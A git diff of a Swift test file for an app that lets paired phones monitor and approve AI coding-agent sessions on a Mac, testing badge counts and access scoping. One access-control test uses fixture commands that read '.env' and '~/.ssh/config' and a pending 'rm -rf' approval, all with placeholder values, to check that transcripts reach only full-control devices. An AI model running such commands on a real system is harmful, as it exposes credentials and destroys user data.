-    /// the one on screen, and the session it hands back is the one both sides now have.
-    @Test func aNewThreadFromThePhoneIsTheMacsOwnNewThread() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        model.codexThreadID = "th_01HZY"
-        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("Earlier."))]
-        model.codexApprovals = [CodexApproval(rpcID: .number(1), kind: .command("ls"))]
-        model.codexTurnActive = true
-
-        let fresh = try await model.newAgentThread(engine: "codex")
-        #expect(fresh.itemCount == 0)
-        #expect(fresh.threadID == nil)
-        #expect(fresh.turnActive == false)
-        #expect(fresh.pendingApprovals == 0)
-        // The Mac's own window, not a copy of it.
-        #expect(model.codexItems.isEmpty)
-
-        // Pi's is a real RPC command rather than a restart, so it needs a Pi to send it to.
-        model.piState = .ready
-        await #expect(throws: AgentSessionError.notRunning("pi")) {
-            try await model.newAgentThread(engine: "pi")
-        }
+        #expect(!pump.isRunning)
+        await hub.cancel(chat.id)
+        await hub.cancel(peer.id)
     }
 
     // MARK: - The badge
 
-    /// What the Chat tab's badge counts, and what it does not.
-    @Test func onlyAFullControlDeviceLightsTheWatchingBadge() async throws {
+    /// What the Chat tab's badge counts, and what it does not — and that it lets go.
+    @Test func onlyAFullControlDeviceLightsTheWatchingBadgeAndItFades() async throws {
         let hub = BuddyEventHub()
-        let mac = await hub.subscribe()
-        #expect(await hub.watchingDeviceCount == 0)
+        let mac = await hub.subscribe(as: .thisMac)
+        let peer = await hub.subscribe(as: .peer)
+        #expect(await hub.agentWatcherCount() == 0)
 
-        let chatOnly = await hub.subscribe(scope: .chat)
-        // A chat-only phone reading `/events` cannot reach an agent session at all, so
-        // telling the owner one is watching *this* would be stronger than the truth.
-        #expect(await hub.watchingDeviceCount == 0)
+        let chatOnly = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
+        // A chat-only phone cannot reach an agent session at all, so telling the owner one
+        // is watching *this* would be stronger than the truth.
+        #expect(await hub.agentWatcherCount() == 0)
 
-        let phone = await hub.subscribe(scope: .full)
-        #expect(await hub.watchingDeviceCount == 1)
-        #expect(await hub.subscriberCount == 3)
+        let phone = await hub.subscribe(as: .device(id: "phone", scope: .full))
+        #expect(await hub.agentWatcherCount() == 1)
         #expect(BuddyWatchingBadge.caption(1) == "Silicon Buddy is watching")
 
-        let tablet = await hub.subscribe(scope: .full)
-        #expect(await hub.watchingDeviceCount == 2)
+        // The same phone polling as well as streaming is still one phone.
+        let now = Date()
+        await hub.noteAgentActivity(deviceID: "phone", at: now)
+        #expect(await hub.agentWatcherCount(now: now) == 1)
+        // A tablet that sent a message and put the stream away still counts, for a while.
+        await hub.noteAgentActivity(deviceID: "tablet", at: now)
+        #expect(await hub.agentWatcherCount(now: now) == 2)
         #expect(BuddyWatchingBadge.caption(2).contains("2 Silicon Buddies"))
-
-        await hub.cancel(tablet.id)
+        #expect(await hub.agentWatcherCount(within: .seconds(180), now: now.addingTimeInterval(179)) == 2)
+        // …and then it does not.
         await hub.cancel(phone.id)
-        #expect(await hub.watchingDeviceCount == 0)
+        #expect(await hub.agentWatcherCount(within: .seconds(180), now: now.addingTimeInterval(181)) == 0)
+
         await hub.cancel(chatOnly.id)
+        await hub.cancel(peer.id)
         await hub.cancel(mac.id)
     }
 
@@ -684,8 +1254,40 @@ struct BuddyAgentSessionTests {
     /// A placeholder, never a real one: this string ends up in nothing but a refusal.
     static let swarmSecret = "swarm-secret-for-the-fixture"
 
-    /// One Codex turn, exactly as its app-server writes it. Recorded from what
-    /// `handleCodexNotification` already reads, not from running the CLI.
+    /// A screening that did not happen, with the guardrail's own sentence — the one every
+    /// test here can inject without asking Jev anything.
+    static let unscreened = GuardrailScreening.unavailable(
+        reason: "Guardrails are off in Settings → TypeSafe (Jev)."
+    )
+
+    static let twoModels = [
+        GatewayAPI.Model(id: "local/qwen3-coder-30b", displayName: "Qwen3-Coder 30B",
+                         where_: "This Mac", serving: true),
+        GatewayAPI.Model(id: "node/studio/qwen3.8-27b", displayName: "Qwen3.8 27B",
+                         where_: "studio"),
+    ]
+
+    /// An `AppModel` with a ledger of its own. The address it lives at may be one an
+    /// earlier test's used, so what was remembered about that one is forgotten first.
+    static func freshModel() -> AppModel {
+        let model = AppModel(settings: .init())
+        BuddyAgentSessions.shared.forget(model)
+        return model
+    }
+
+    static func run(codex model: AppModel) {
+        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
+    }
+
+    /// A Pi card the guardrail has spoken about and left to a person.
+    static func screenedPiCard(_ arguments: String) -> AppModel.PiItem {
+        let card = AppModel.PiItem(
+            kind: .approval(requestID: "ui-\(UUID().uuidString.prefix(4))", tool: "bash"),
+            text: arguments, running: false, screening: unscreened
+        )
+        return card
+    }
+
     static let codexTurn: [(String, String)] = [
         ("thread/started", #"{"thread":{"id":"th_01HZY"}}"#),
         ("turn/started", #"{}"#),
@@ -779,6 +1381,8 @@ struct BuddyAgentSessionTests {
 
     /// Every route this milestone adds, with a body where one is needed — so the scope test
     /// covers all of them rather than a representative sample.
+    /// Every route this milestone adds, with a body where one is needed — so the scope test
+    /// covers all of them rather than a representative sample.
     static let everyAgentRoute: [(String, String, String?)] = [
         ("GET", "/agent/sessions", nil),
         ("GET", "/agent/sessions/codex", nil),
@@ -808,31 +1412,119 @@ struct BuddyAgentSessionTests {
         return BuddyAgentSessions.shared.frames(from: snapshot)
     }
 
-    static func kinds(_ events: [BuddyEvent]) -> [String] {
-        events.compactMap {
+    static func events(_ frames: [BuddyEvent]) -> [ControlAPI.AgentEvent] {
+        frames.compactMap {
             guard case .agent(let event) = $0 else { return nil }
-            return event.kind
+            return event
         }
+    }
+
+    static func kinds(_ events: [BuddyEvent]) -> [String] {
+        Self.events(events).map(\.kind)
     }
 
     static func states(_ events: [BuddyEvent]) -> [String] {
-        events.compactMap {
-            guard case .agent(let event) = $0 else { return nil }
-            return event.state
+        Self.events(events).compactMap(\.state)
+    }
+
+    static func decodeAgent(_ frame: BuddyEvent.Frame) -> ControlAPI.AgentEvent? {
+        guard frame.name == "agent" else { return nil }
+        return try? JSONDecoder().decode(ControlAPI.AgentEvent.self, from: frame.data)
+    }
+}
+
+/// The `agent` frames one hub subscription has received, collected off the test's task.
+final class AgentFrames: @unchecked Sendable {
+    private let lock = NSLock()
+    private var received: [ControlAPI.AgentEvent] = []
+
+    func append(_ event: ControlAPI.AgentEvent) {
+        lock.lock()
+        received.append(event)
+        lock.unlock()
+    }
+
+    var events: [ControlAPI.AgentEvent] {
+        lock.lock()
+        defer { lock.unlock() }
+        return received
+    }
+
+    func waitFor(
+        within limit: Duration = .seconds(20),
+        _ condition: @Sendable ([ControlAPI.AgentEvent]) -> Bool
+    ) async throws -> Bool {
+        let deadline = ContinuousClock.now + limit
+        while !condition(events) {
+            guard ContinuousClock.now < deadline else { return false }
+            try await Task.sleep(for: .milliseconds(10))
+        }
+        return true
+    }
+}
+
+/// Every `Settings` a test's code tried to write down, instead of writing it.
+final class SaveRecorder: @unchecked Sendable {
+    private let lock = NSLock()
+    private var saved: [Settings] = []
+
+    var record: @Sendable (Settings) -> Void {
+        { [self] settings in
+            lock.lock()
+            saved.append(settings)
+            lock.unlock()
         }
     }
 
+    var count: Int {
+        lock.lock()
+        defer { lock.unlock() }
+        return saved.count
+    }
+
+    var lastCodexModel: String? {
+        lock.lock()
+        defer { lock.unlock() }
+        return saved.last?.codexModel
+    }
 }
 
-/// The one agent test that opens a real `/events` stream, and so the one that has to share
-/// a suite with the other live one.
+/// Binds the agent sessions' seams for every test in a suite: the guardrail reported off
+/// rather than read from this Mac's own Jev settings, and any save handed to nobody rather
+/// than written — `Settings.save()` also writes the login Keychain, which no test may touch.
+/// A test that wants a different answer binds its own inside this one.
+struct HermeticAgentSeams: SuiteTrait, TestTrait, TestScoping {
+    var isRecursive: Bool { true }
+
+    func provideScope(
+        for test: Test, testCase: Test.Case?,
+        performing function: @Sendable () async throws -> Void
+    ) async throws {
+        try await AgentSessionSeams.$guardrailsOn.withValue(false) {
+            try await AgentSessionSeams.$saveSettings.withValue({ _ in }) {
+                try await function()
+            }
+        }
+    }
+}
+
+extension Trait where Self == HermeticAgentSeams {
+    static var hermeticAgentSeams: Self { Self() }
+}
+
+/// The tests that open a real `/events` stream against a real `AppModel`, and so the ones
+/// that have to share a suite with the other live one.
 ///
 /// `BuddyEventPump` and `AgentEventPump` are process-wide singletons — `AppModel` is
 /// `@Observable`, so an extension cannot hold their task — and a singleton watches one hub.
 /// Two suites each opening a stream against their own hub would take the pumps off each
 /// other, and whichever lost would wait for frames that were being posted somewhere else.
-/// `BuddyLiveEventTests` is `.serialized` for exactly that reason, so this joins it rather
+/// `BuddyLiveEventTests` is `.serialized` for exactly that reason, so these join it rather
 /// than racing it.
+///
+/// What the server reads on its own tasks — whether the guardrail is on — is not under a
+/// test's task-local seams, so here it is this Mac's own Jev setting, read and never
+/// written. Nothing asserted below depends on it.
 extension BuddyLiveEventTests {
 
     /// The whole chain once: a real `AppModel` as the host, a real control server, a real
@@ -846,9 +1538,8 @@ extension BuddyLiveEventTests {
             BuddyEventPump.shared.stop()
         }
 
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
+        let model = BuddyAgentSessionTests.freshModel()
+        BuddyAgentSessionTests.run(codex: model)
         model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("Ready."))]
 
         try await withServer(host: model) { fixture in
@@ -875,22 +1566,30 @@ extension BuddyLiveEventTests {
             // And the frames reach a subscriber, which is the wiring `beginEventUpdates`
             // is responsible for: a change made while the stream is open, not a snapshot
             // taken at connect.
-            let changing = Task { @MainActor in
-                try? await Task.sleep(for: .milliseconds(300))
-                model.codexItems.append(
-                    CodexChatItem(id: "a2", kind: .assistant("Working on it."))
-                )
-            }
-            defer { changing.cancel() }
-
-            let frames = try await fixture.phone.events(
-                "GET", "/events", token: phone.token, body: nil,
-                until: { frames in
-                    frames.contains { $0.name == "agent" && $0.data.contains("a2") }
+            let received = Recorder()
+            let reader = Task {
+                try await fixture.phone.events(
+                    "GET", "/events", token: phone.token, body: nil
+                ) { frames in
+                    received.set(frames)
+                    return frames.contains { $0.name == "agent" && $0.data.contains("a2") }
                 }
+            }
+            defer { reader.cancel() }
+
+            // The opening first: state and turn for both engines. It is the watcher's
+            // baseline reading, so a change made before it would be in the transcript a
+            // phone fetches rather than in a frame — which is the rule a phone follows, and
+            // so the rule this test follows.
+            #expect(try await received.waitFor { $0.filter { $0.name == "agent" }.count >= 4 })
+            model.codexItems.append(
+                CodexChatItem(id: "a2", kind: .assistant("Working on it."))
             )
+            #expect(try await received.waitFor {
+                $0.contains { $0.name == "agent" && $0.data.contains("a2") }
+            })
             let agent = try #require(
-                frames.last { $0.name == "agent" && $0.data.contains("a2") }
+                received.frames.last { $0.name == "agent" && $0.data.contains("a2") }
             )
             let event = try JSONDecoder().decode(
                 ControlAPI.AgentEvent.self, from: Data(agent.data.utf8)
@@ -898,18 +1597,186 @@ extension BuddyLiveEventTests {
             #expect(event.engine == "codex")
             #expect(event.kind == "item")
             #expect(event.item?.text == "Working on it.")
-            #expect(event.seq > 0)
+            #expect(event.epoch == detail.epoch)
         }
     }
 
+    /// B1, over the wire and mutation-proof: a full-control phone, a chat-only phone and
+    /// the swarm all hold `/events` at once, the transcript changes, and only the first is
+    /// sent it. The other two still receive what they always did.
+    ///
+    /// The full-control stream is what makes this meaningful. With no audience for agent
+    /// frames the watcher would not run at all, and "no agent frames arrived" would be true
+    /// whatever the filter did; with one, the frames exist, and the filter is the only
+    /// thing keeping them from the other two.
+    @Test func aChatOnlyPhoneAndTheSwarmAreNeverSentATranscript() async throws {
+        AgentEventPump.shared.stop()
+        BuddyEventPump.shared.stop()
+        defer {
+            AgentEventPump.shared.stop()
+            BuddyEventPump.shared.stop()
+        }
+
+        let model = BuddyAgentSessionTests.freshModel()
+        BuddyAgentSessionTests.run(codex: model)
+        model.codexItems = [CodexChatItem(
+            id: "c1",
+            kind: .command(command: "cat .env", output: "API_KEY=placeholder", running: false)
+        )]
+
+        try await withServer(host: model, swarmToken: BuddyAgentSessionTests.swarmSecret) {
+            fixture in
+            let full = try await fixture.pair(name: "Studio phone")
+            let chat = try await fixture.pair(name: "Lent out", scope: .chat)
+
+            // Sanity: the routes themselves are closed to both.
+            #expect(try await fixture.phone.status(
+                "GET", "/agent/sessions/codex", token: chat.token
+            ) == 403)
+            #expect(try await fixture.local.status(
+                "GET", "/agent/sessions/codex", token: BuddyAgentSessionTests.swarmSecret
+            ) == 403)
+
+            let watching = Recorder()
+            let lentOut = Recorder()
+            let node = Recorder()
+            let readers = [
+                Task { try await fixture.phone.events(
+                    "GET", "/events", token: full.token, body: nil
+                ) { frames in watching.set(frames); return false } },
+                Task { try await fixture.phone.events(
+                    "GET", "/events", token: chat.token, body: nil
+                ) { frames in lentOut.set(frames); return false } },
+                Task { try await fixture.local.events(
+                    "GET", "/events", token: BuddyAgentSessionTests.swarmSecret, body: nil
+                ) { frames in node.set(frames); return false } },
+            ]
+            defer { readers.forEach { $0.cancel() } }
+
+            // Every stream has started before anything changes — and the full-control one
+            // has had its opening, which is the watcher's baseline: a change made before it
+            // would be in the transcript that phone fetches, not in a frame.
+            #expect(try await watching.waitFor { $0.filter { $0.name == "agent" }.count >= 4 })
+            #expect(try await lentOut.waitFor { !$0.isEmpty })
+            #expect(try await node.waitFor { !$0.isEmpty })
+
+            model.codexItems.append(CodexChatItem(
+                id: "c2",
+                kind: .command(command: "cat ~/.ssh/config", output: "Host placeholder",
+                               running: false)
+            ))
+            model.codexApprovals = [CodexApproval(
+                rpcID: .number(4), kind: .command("rm -rf ~/placeholder"),
+                screening: BuddyAgentSessionTests.unscreened
+            )]
+
+            // The full-control phone is sent both.
+            #expect(try await watching.waitFor { frames in
+                let agent = frames.filter { $0.name == "agent" }.map(\.data)
+                return agent.contains { $0.contains("Host placeholder") }
+                    && agent.contains { $0.contains("rm -rf") }
+            })
+            // Give the other two every chance to receive the same.
+            try await Task.sleep(for: .milliseconds(500))
+
+            #expect(lentOut.agentData.isEmpty, "chat-only device got: \(lentOut.agentData)")
+            #expect(node.agentData.isEmpty, "swarm got: \(node.agentData)")
+            // Not a dead stream: both are still sent what they always were.
+            #expect(lentOut.frames.contains { $0.name == "status" || $0.name == "heartbeat" })
+            #expect(node.frames.contains { $0.name == "status" || $0.name == "heartbeat" })
+        }
+    }
+
+    /// A phone that drops off the network without closing its stream stops counting for
+    /// the badge once the server notices the socket is gone.
+    @Test func theBadgeLetsGoOfAPhoneThatHungUp() async throws {
+        AgentEventPump.shared.stop()
+        BuddyEventPump.shared.stop()
+        defer {
+            AgentEventPump.shared.stop()
+            BuddyEventPump.shared.stop()
+        }
+        let model = BuddyAgentSessionTests.freshModel()
+        let hub = BuddyEventHub()
+        try await withServer(host: model, hub: hub) { fixture in
+            let full = try await fixture.pair()
+            let stream = try await fixture.phone.openEventStream(token: full.token)
+            let appeared = ContinuousClock.now + .seconds(5)
+            while await hub.agentWatcherCount() == 0, ContinuousClock.now < appeared {
+                try await Task.sleep(for: .milliseconds(20))
+            }
+            #expect(await hub.agentWatcherCount() == 1)
+
+            stream.cancel()   // abrupt: the client task goes, the socket with it
+            let gone = ContinuousClock.now + .seconds(10)
+            while await hub.agentWatcherCount() > 0, ContinuousClock.now < gone {
+                try await Task.sleep(for: .milliseconds(20))
+            }
+            #expect(await hub.agentWatcherCount() == 0)
+        }
+    }
+}
+
+/// The frames one stream has received so far. Updated from inside the SSE reader's
+/// callback, read from the test's loop.
+final class Recorder: @unchecked Sendable {
+    private let lock = NSLock()
+    private var received: [TestClient.Frame] = []
+
+    func set(_ frames: [TestClient.Frame]) {
+        lock.lock()
+        received = frames
+        lock.unlock()
+    }
+
+    var frames: [TestClient.Frame] {
+        lock.lock()
+        defer { lock.unlock() }
+        return received
+    }
+
+    var agentData: [String] { frames.filter { $0.name == "agent" }.map(\.data) }
+
+    /// Waits, up to a deadline, for what this stream has received to satisfy `condition`.
+    /// A deadline because an SSE stream never ends by itself: a test that waited on it
+    /// without one would hang rather than fail.
+    func waitFor(
+        within limit: Duration = .seconds(20),
+        _ condition: @Sendable ([TestClient.Frame]) -> Bool
+    ) async throws -> Bool {
+        let deadline = ContinuousClock.now + limit
+        while !condition(frames) {
+            guard ContinuousClock.now < deadline else { return false }
+            try await Task.sleep(for: .milliseconds(20))
+        }
+        return true
+    }
+}
+
+/// One HTTP exchange written by hand — for the two things `URLSession` will not send: a
+/// `Host` header of the test's choosing, and a look at the status line itself. On
+/// `URLSession`'s own stream task rather than a bare socket, so it rides the same
+/// networking every other request in these tests does. The server closes after one
+/// response, which is how the read knows it has all of it.
+func rawHTTP(port: Int, session: URLSession, _ request: String) async throws -> String {
+    let task = session.streamTask(withHostName: "127.0.0.1", port: port)
+    task.resume()
+    defer { task.cancel() }
+    try await task.write(Data(request.utf8), timeout: 20)
+    var received = Data()
+    while true {
+        let (data, atEOF) = try await task.readData(ofMinLength: 1, maxLength: 65_536, timeout: 20)
+        if let data { received.append(data) }
+        if atEOF || data == nil { break }
+    }
+    return String(decoding: received, as: UTF8.self)
 }
 
 // MARK: - The fixture
 
 // At file scope rather than inside the suite: the live half of these tests lives in
-// `BuddyLiveEventTests` (see the extension at the bottom of this file) and needs the same
-// loopback server, the same private handshake file and the same standing-in-for-a-tailnet
-// second listener.
+// `BuddyLiveEventTests` (see the extension above) and needs the same loopback server, the
+// same private handshake file and the same standing-in-for-a-tailnet second listener.
 
 struct AgentFixture {
     let server: ControlServer
@@ -947,7 +1814,7 @@ func withAgentServer(
 
 @MainActor
 func withServer(
-    host: any ControlHost, swarmToken: String? = nil,
+    host: any ControlHost, swarmToken: String? = nil, hub: BuddyEventHub = BuddyEventHub(),
     _ body: (AgentFixture) async throws -> Void
 ) async throws {
     let directory = FileManager.default.temporaryDirectory
@@ -958,8 +1825,7 @@ func withServer(
     let handshakeURL = directory.appendingPathComponent("control.json")
     let registry = BuddyRegistry(url: directory.appendingPathComponent("buddy.json"))
     let server = ControlServer(
-        host: host, handshakeURL: handshakeURL, buddy: registry,
-        events: BuddyEventHub(),
+        host: host, handshakeURL: handshakeURL, buddy: registry, events: hub,
         // Never the real CLI: a test must not bind whatever tailnet this machine is on.
         discoverTailnetAddress: { nil }
     )
@@ -1021,9 +1887,10 @@ extension BuddyTestHost {
 
     private func summary(_ engine: String) -> ControlAPI.AgentSessionSummary {
         ControlAPI.AgentSessionSummary(
-            engine: engine, state: "running", model: "local/qwen3",
+            engine: engine, state: "running", epoch: "fixture-epoch", model: "local/qwen3",
             modelChoices: [.init(id: "local/qwen3", label: "Qwen3", where: "This Mac")],
-            cwd: "/tmp/fixture", updatedAt: "2026-09-19T10:00:00Z"
+            cwd: "~/fixture", approvals: "asked", sandbox: "read-only",
+            updatedAt: "2026-09-19T10:00:00Z"
         )
     }
 
@@ -1035,14 +1902,18 @@ extension BuddyTestHost {
     }
 
     public func agentSession(
-        engine: String, since: String?
+        engine: String, query: ControlAPI.AgentSessionQuery
     ) async throws -> ControlAPI.AgentSessionDetail {
         guard ControlAPI.agentEngines.contains(engine) else {
             throw AgentSessionError.unknownEngine(engine)
         }
-        await AgentCallLog.shared.note("session \(engine) since=\(since ?? "-")")
+        await AgentCallLog.shared.note(
+            "session \(engine) since=\(query.since.map(String.init) ?? "-") "
+            + "epoch=\(query.epoch ?? "-") limit=\(query.limit.map(String.init) ?? "-")"
+        )
         return ControlAPI.AgentSessionDetail(
-            session: summary(engine), items: [], approvals: [], seq: 12
+            session: summary(engine), items: [], approvals: [], seq: 12,
+            epoch: "fixture-epoch"
         )
     }
 
